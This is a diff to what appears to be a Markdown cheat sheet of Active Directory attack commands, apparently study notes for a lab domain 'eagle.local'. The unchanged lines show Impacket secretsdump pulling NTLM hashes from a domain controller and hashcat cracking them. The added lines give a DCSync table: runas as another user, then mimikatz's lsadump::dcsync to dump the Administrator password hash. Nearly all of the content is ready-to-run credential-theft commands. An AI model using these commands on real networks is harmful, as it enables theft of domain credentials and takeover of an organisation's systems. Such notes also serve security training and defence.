@@ -47,3 +47,11 @@
 #### 2) python3 Impacket-Secretsdump.py -just-dc-ntlm DOMAIN/AD_ADMIN_USER@DC_IP
 
 #### 3) hashcat -m 1000 -a 0 hashes.txt /path/to/wordlist.txt
+
+# DCSync
+
+| Command                                                      | Description                                                  |
+| ------------------------------------------------------------ | ------------------------------------------------------------ |
+| `runas /user:eagle\rocky cmd.exe`                            | Start a new instance of `cmd.exe` as the user `eagle\rocky`.
+| `mimikatz.exe`                                               | Tool used to implement the DCsync attack |
+| `lsadump::dcsync /domain:eagle.local /user:Administrator`    | Command used in `mimikatz` to DCSync and dump the `Administrator` password hash |
